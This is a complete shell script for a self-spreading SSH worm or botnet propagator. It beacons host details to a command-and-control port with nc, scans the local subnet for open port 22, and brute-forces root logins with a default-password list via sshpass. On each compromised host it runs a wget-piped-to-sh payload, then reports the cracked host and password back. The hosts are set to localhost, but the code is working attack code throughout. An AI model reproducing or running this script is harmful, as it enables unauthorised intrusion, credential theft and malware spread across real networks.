#!/bin/sh
C2_HOST=127.0.0.1
C2_PORT=10001
MY_IP=$(hostname -i 2>/dev/null)
[ x$MY_IP = x ] && MY_IP=$(ifconfig 2>/dev/null | head -2 | tail -1 | tr -s ' ' | cut -d ' ' -f 3)
echo FLEETOK:$MY_IP:$(hostname):$(uname -m) | nc $C2_HOST $C2_PORT -w 5 2>/dev/null
SUBNET=$(echo $MY_IP | cut -d. -f1-3)
for i in $(seq 1 254); do
  TARGET=$SUBNET.$i
  [ x$TARGET = x$MY_IP ] && continue
  timeout 2 sh -c 'echo >/dev/tcp/$1/22' _ $TARGET 2>/dev/null || continue
  for PASS in admin 1234 root pass 123456 12345 default; do
    sshpass -p $PASS ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$TARGET 'wget -q -O - http://127.0.0.1:10004/fs.sh | sh' >/dev/null 2>&1 && {
      echo PWNED:$TARGET:$PASS | nc $C2_HOST $C2_PORT -w 3 2>/dev/null
      break
    }
  done
done
